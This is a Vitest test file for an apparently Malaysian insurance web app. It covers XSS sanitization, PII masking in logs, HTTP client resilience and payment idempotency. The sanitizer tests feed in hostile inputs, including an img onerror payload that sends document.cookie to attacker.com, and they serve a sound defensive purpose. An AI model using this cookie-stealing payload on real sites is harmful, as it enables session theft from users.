import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { InputSanitizer } from '../core/utils/sanitizer';
import { Logger } from '../core/telemetry/logger';
import { HttpClient, GatewayIntegrationError } from '../core/api/httpClient';
import { PaymentService, InitiatePaymentRequest } from '../core/api/paymentService';
import { INITIAL_DOCTOR_PROFILE, INITIAL_COVERAGE } from '../core/state/WorkflowContext';

describe('Production Hardening: Security, Integration & Reliability', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
    vi.useRealTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
    vi.restoreAllMocks();
  });

  describe('Input Sanitization & Anti-XSS Guards', () => {
    it('strips script tags and executable JavaScript from freeform text fields', () => {
      const maliciousInput = '<script>alert("XSS")</script>Dr. Lim & Partners Clinic';
      const sanitized = InputSanitizer.sanitizeText(maliciousInput, 200);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Dr. Lim & Partners Clinic');
    });

    it('strips HTML event handlers and nested iframe attacks', () => {
      const payload = '<img src=x onerror="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)">Gleneagles Hospital';
      const sanitized = InputSanitizer.sanitizeText(payload, 200);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('<img');
      expect(sanitized).toContain('Gleneagles Hospital');
    });

    it('detects potential XSS vectors accurately', () => {
      expect(InputSanitizer.detectPotentialXSS('<script>alert(1)</script>')).toBe(true);
      expect(InputSanitizer.detectPotentialXSS('javascript:void(0)')).toBe(true);
      expect(InputSanitizer.detectPotentialXSS('<div onmouseover="evil()">')).toBe(true);
      expect(InputSanitizer.detectPotentialXSS('<iframe src="malicious.html"></iframe>')).toBe(true);
      expect(InputSanitizer.detectPotentialXSS('Suite 12-05, Menara Medical, Jalan Ampang')).toBe(false);
      expect(InputSanitizer.detectPotentialXSS('Orthopaedic Surgeon with 10 years experience')).toBe(false);
    });

    it('enforces maximum length boundaries and removes control characters', () => {
      const veryLong = 'A'.repeat(500);
      const sanitized = InputSanitizer.sanitizeText(veryLong, 50);
      expect(sanitized.length).toBe(50);

      const controlChars = 'Dr.\u0000\u0008 John Doe';
      expect(InputSanitizer.sanitizeText(controlChars)).toBe('Dr. John Doe');
    });

    it('escapes dangerous HTML characters in sanitizeHtml', () => {
      const unsafe = '<div class="test">Fish & Chips "quoted" \'single\'</div>';
      const safe = InputSanitizer.sanitizeHtml(unsafe);
      expect(safe).toContain('&lt;div');
      expect(safe).toContain('&amp;');
      expect(safe).toContain('&quot;');
      expect(safe).toContain('&#x27;');
    });
  });

  describe('PII Masking & Privacy Telemetry (PDPA 2010 Compliance)', () => {
    it('masks Malaysian NRIC numbers in telemetry logs', () => {
      const rawNric = '850612-14-5561';
      const masked = Logger.maskNric(rawNric);
      expect(masked).toBe('850612-14-XXXX');
      expect(masked).not.toContain('5561');

      const unhyphenated = '901231015678';
      expect(Logger.maskNric(unhyphenated)).toBe('901231-01-XXXX');
    });

    it('masks email addresses preserving only first and last local characters and domain', () => {
      const email = 'doctor.chong@specialist.com.my';
      const masked = Logger.maskEmail(email);
      expect(masked).toMatch(/^d\*\*\*g@specialist\.com\.my$/);
      expect(masked).not.toContain('doctor.chong');
    });

    it('masks mobile phone numbers displaying only prefix and last 4 digits', () => {
      const phone1 = '0123456789';
      const masked1 = Logger.maskPhone(phone1);
      expect(masked1).toBe('+60 12-***-6789');

      const phone2 = '+60 19-876 5432';
      const masked2 = Logger.maskPhone(phone2);
      expect(masked2).toBe('+60 19-***-5432');
    });

    it('deeply redacts sensitive keys in arbitrary JSON audit payloads', () => {
      const sensitivePayload = {
        applicant: {
          name: 'Dr. Siti Aminah',
          nric: '880101-10-5432',
          email: 'siti@clinic.com.my',
          phone: '0171234567',
        },
        billing: {
          cardNumber: '4111222233334444',
          cvv: '123',
          cardToken: 'tok_live_secret_998877',
          otpCode: '654321',
        },
      };

      const sanitized = Logger.sanitizePayload(sensitivePayload) as Record<string, any>;

      expect(sanitized.applicant.nric).toBe('880101-10-XXXX');
      expect(sanitized.applicant.email).toMatch(/^s\*\*\*i@clinic\.com\.my$/);
      expect(sanitized.applicant.phone).toBe('+60 17-***-4567');
      expect(sanitized.billing.cardNumber).toBe('[REDACTED]');
      expect(sanitized.billing.cvv).toBe('[REDACTED]');
      expect(sanitized.billing.cardToken).toBe('[REDACTED]');
      expect(sanitized.billing.otpCode).toBe('[REDACTED]');
    });
  });

  describe('HTTP Client & Resilience Specifications', () => {
    it('generates secure UUID v4 idempotency keys', () => {
      const key1 = HttpClient.generateIdempotencyKey();
      const key2 = HttpClient.generateIdempotencyKey();
      expect(key1).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i);
      expect(key1).not.toBe(key2);
    });

    it('decodes base64-enveloped responses per Chubb gateway specification', async () => {
      const mockData = { quoteId: 'Q-2026-999', premium: 1850.5 };
      const rawEnvelope = {
        status: 'success',
        data: btoa(JSON.stringify(mockData)),
      };

      globalThis.fetch = vi.fn().mockResolvedValue({
        ok: true,
        status: 200,
        headers: new Headers({ 'content-type': 'application/json' }),
        json: async () => rawEnvelope,
      } as Response);

      const res = await HttpClient.request<{ quoteId: string; premium: number }>('/api/v1/quote');
      expect(res.quoteId).toBe('Q-2026-999');
      expect(res.premium).toBe(1850.5);
    });

    it('parses and standardizes RFC 7807 Problem Details on HTTP errors', async () => {
      const rfc7807Error = {
        type: 'https://api.doctorshield.com.my/errors/invalid-nric',
        title: 'Invalid Identity Document',
        status: 422,
        detail: 'The provided NRIC failed JPN validation check.',
        instance: '/api/v1/customers/lookup?nric=000000000000',
      };

      globalThis.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 422,
        headers: new Headers({ 'content-type': 'application/problem+json' }),
        json: async () => rfc7807Error,
      } as Response);

      await expect(HttpClient.request('/api/v1/customers/lookup')).rejects.toThrow(GatewayIntegrationError);

      try {
        await HttpClient.request('/api/v1/customers/lookup');
      } catch (err) {
        const gwErr = err as GatewayIntegrationError;
        expect(gwErr.status).toBe(422);
        expect(gwErr.statusCode).toBe(422);
        expect(gwErr.problemDetails?.title).toBe('Invalid Identity Document');
        expect(gwErr.problemDetails?.detail).toBe('The provided NRIC failed JPN validation check.');
      }
    });

    it('blocks mock simulation in production when mock mode is disabled', () => {
      const originalEnv = import.meta.env.VITE_ENABLE_MOCK_API;
      (import.meta.env as any).VITE_ENABLE_MOCK_API = 'false';

      expect(HttpClient.isMockAllowed()).toBe(false);

      (import.meta.env as any).VITE_ENABLE_MOCK_API = 'true';
      expect(HttpClient.isMockAllowed()).toBe(true);

      (import.meta.env as any).VITE_ENABLE_MOCK_API = originalEnv;
    });

    it('aborts requests that exceed timeout duration', async () => {
      vi.useFakeTimers();

      globalThis.fetch = vi.fn().mockImplementation((_url, options) => {
        return new Promise((_resolve, reject) => {
          if (options?.signal) {
            options.signal.addEventListener('abort', () => {
              const abortErr = new Error('The user aborted a request.');
              abortErr.name = 'AbortError';
              reject(abortErr);
            });
          }
        });
      });

      const requestPromise = HttpClient.request('/api/slow', {
        timeoutMs: 1000,
        retries: 0,
      });

      vi.advanceTimersByTime(1100);

      await expect(requestPromise).rejects.toThrow(/timed out/i);
      vi.useRealTimers();
    });
  });

  describe('Payment Integrity & Idempotency Safeguards', () => {
    it('generates distinct idempotency keys per payment transaction attempt', async () => {
      const quote = {
        baseGross: 1500,
        clinicGross: 0,
        picGross: 0,
        totalGross: 1500,
        discountAmount: 0,
        nettPremium: 1500,
        sst: 120,
        stampDuty: 10,
        totalPayable: 1630,
        rateLockExpiresAt: new Date(Date.now() + 900000).toISOString(),
        currency: 'MYR',
      };

      const req1: InitiatePaymentRequest = {
        quotationNumber: 'Q-TEST-001',
        quoteToken: 'tok_quote_111',
        paymentChannel: 'personal',
        doctorProfile: INITIAL_DOCTOR_PROFILE,
        coverage: INITIAL_COVERAGE,
        pricing: quote,
      };

      const req2: InitiatePaymentRequest = {
        quotationNumber: 'Q-TEST-002',
        quoteToken: 'tok_quote_222',
        paymentChannel: 'business',
        doctorProfile: INITIAL_DOCTOR_PROFILE,
        coverage: INITIAL_COVERAGE,
        pricing: quote,
      };

      const res1 = await PaymentService.initiatePayment(req1);
      const res2 = await PaymentService.initiatePayment(req2);

      expect(res1.transactionReference).toBeDefined();
      expect(res2.transactionReference).toBeDefined();
      expect(res1.transactionReference).not.toBe(res2.transactionReference);
      expect(res1.idempotencyKey).not.toBe(res2.idempotencyKey);
    });

    it('rejects duplicate payment requests with the same idempotency key', async () => {
      const quote = {
        baseGross: 1500,
        clinicGross: 0,
        picGross: 0,
        totalGross: 1500,
        discountAmount: 0,
        nettPremium: 1500,
        sst: 120,
        stampDuty: 10,
        totalPayable: 1630,
        rateLockExpiresAt: new Date(Date.now() + 900000).toISOString(),
        currency: 'MYR',
      };

      const fixedKey = 'IDEMP-FIXED-KEY-999';
      const req: InitiatePaymentRequest = {
        quotationNumber: 'Q-TEST-DUP',
        quoteToken: 'tok_quote_dup',
        paymentChannel: 'personal',
        doctorProfile: INITIAL_DOCTOR_PROFILE,
        coverage: INITIAL_COVERAGE,
        pricing: quote,
        idempotencyKey: fixedKey,
      };

      await PaymentService.initiatePayment(req);

      // Second attempt with exact same key must throw duplicate error
      await expect(PaymentService.initiatePayment(req)).rejects.toThrow(/Duplicate payment initiation request detected/i);
    });

    it('rejects stale or expired quotations during payment initiation', async () => {
      const expiredQuote = {
        baseGross: 1500,
        clinicGross: 0,
        picGross: 0,
        totalGross: 1500,
        discountAmount: 0,
        nettPremium: 1500,
        sst: 120,
        stampDuty: 10,
        totalPayable: 1630,
        rateLockExpiresAt: new Date(Date.now() - 60000).toISOString(), // expired 1 min ago
        currency: 'MYR',
      };

      const req: InitiatePaymentRequest = {
        quotationNumber: 'Q-EXPIRED-001',
        quoteToken: 'tok_quote_expired',
        paymentChannel: 'personal',
        doctorProfile: INITIAL_DOCTOR_PROFILE,
        coverage: INITIAL_COVERAGE,
        pricing: expiredQuote,
      };

      await expect(PaymentService.initiatePayment(req)).rejects.toThrow(/Quotation rate lock expired/i);
    });
  });
});
